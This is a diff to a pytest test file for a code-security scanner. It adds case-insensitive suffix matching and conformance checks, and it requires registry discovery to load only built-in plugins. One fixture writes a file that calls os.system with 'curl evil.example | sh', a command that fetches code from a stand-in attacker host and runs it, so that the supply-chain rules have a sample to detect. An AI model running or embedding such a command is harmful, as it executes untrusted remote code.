@@ -9,6 +9,7 @@ from collections.abc import Iterator, Sequence
 from pathlib import Path
 
 import pytest
+from guardana.core.plugins import PluginMode, PluginTrust
 from guardana.core.profile.loader import default_profile
 from guardana.core.registry import Registry
 from guardana.core.rule import Rule
@@ -44,8 +45,9 @@ class _FlatFileTarget(Target):
         return f"flat://{self._root}"
 
     def iter_files(self, suffixes: tuple[str, ...] | None = None) -> Iterator[Path]:
+        wanted = None if suffixes is None else {suffix.lower() for suffix in suffixes}
         for path in sorted(self._root.rglob("*")):
-            if path.is_file() and (suffixes is None or path.suffix in suffixes):
+            if path.is_file() and (wanted is None or path.suffix.lower() in wanted):
                 yield path
 
     def python_source(self, path: Path) -> PythonSource | None:
@@ -56,6 +58,15 @@ class _FlatFileTarget(Target):
 
     def unread_sources(self) -> tuple[UnreadSource, ...]:
         return ()
+
+
+class _ExactCaseTarget(_FlatFileTarget):
+    """Filters suffixes by exact case, so a rule asking for `.pkl` never sees `model.PKL`."""
+
+    def iter_files(self, suffixes: tuple[str, ...] | None = None) -> Iterator[Path]:
+        for path in sorted(self._root.rglob("*")):
+            if path.is_file() and (suffixes is None or path.suffix in suffixes):
+                yield path
 
 
 class _LiarTarget(Target):
@@ -101,7 +112,9 @@ def test_a_third_party_file_target_runs_the_built_in_artifact_rules(tmp_path: Pa
     """
     (tmp_path / "loader.py").write_text("import os\nos.system('curl evil.example | sh')\n")
 
-    result = Runner(Registry.discover(), default_profile()).run(_FlatFileTarget(tmp_path))
+    result = Runner(
+        Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)), default_profile()
+    ).run(_FlatFileTarget(tmp_path))
 
     assert result.errors == ()
     assert any(f.rule_id.startswith("guardana.supply_chain") for f in result.findings), (
@@ -124,7 +137,9 @@ def test_locator_contract_is_exported_from_the_public_top_level() -> None:
 
 def test_declaring_a_capability_without_its_surface_is_an_error_not_silence() -> None:
     """One error naming the missing surface, instead of nineteen rules failing."""
-    result = Runner(Registry.discover(), default_profile()).run(_LiarTarget())
+    result = Runner(
+        Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)), default_profile()
+    ).run(_LiarTarget())
 
     assert [e.stage for e in result.errors] == ["capability"]
     assert "read_files" in result.errors[0].reason
@@ -143,7 +158,22 @@ def test_the_conformance_kit_catches_a_target_that_under_declares() -> None:
 
 
 def test_the_conformance_kit_accepts_a_correct_target(tmp_path: Path) -> None:
+    (tmp_path / "model.PKL").write_bytes(b"")
+    (tmp_path / "notes.txt").write_bytes(b"")
+
     assert_target_conforms(_FlatFileTarget(tmp_path))
+
+
+def test_the_conformance_kit_refuses_a_target_that_filters_suffixes_by_case(
+    tmp_path: Path,
+) -> None:
+    """`model.PKL` handed to no rule asking for `.pkl` is a scan that reads clean."""
+    (tmp_path / "model.PKL").write_bytes(b"")
+
+    with pytest.raises(
+        TargetContractError, match=r"iter_files\(\('\.pkl',\)\) leaves out model\.PKL"
+    ):
+        assert_target_conforms(_ExactCaseTarget(tmp_path))
 
 
 def test_unmet_surfaces_names_every_gap_at_once() -> None:
@@ -162,7 +192,11 @@ def test_every_capability_with_a_surface_is_reachable_from_a_built_in_rule() -> 
     """
     from guardana.core.target.protocols import CAPABILITY_SURFACE  # noqa: PLC0415
 
-    needed = {c for rule in Registry.discover().rules() for c in rule.meta.required_capabilities}
+    needed = {
+        c
+        for rule in Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)).rules()
+        for c in rule.meta.required_capabilities
+    }
     unused = sorted(str(c) for c in CAPABILITY_SURFACE if c not in needed)
     assert not unused, f"capabilities with a surface and no rule asking for them: {unused}"
 
@@ -196,7 +230,11 @@ def test_a_rule_declaring_no_capability_is_not_offered_a_surface_it_cannot_use()
     # Selection still belongs to the runner and to `required_capabilities`. The
     # protocol is the narrower question asked at the point of use, not a second
     # selection mechanism that could disagree with the first.
-    rules = [r for r in Registry.discover().rules() if r.meta.target_kind is TargetKind.ARTIFACT]
+    rules = [
+        r
+        for r in Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)).rules()
+        if r.meta.target_kind is TargetKind.ARTIFACT
+    ]
     assert rules
     assert all(Capability.READ_FILES in r.meta.required_capabilities for r in rules), (
         "an artifact rule that does not declare read_files would be planned against "
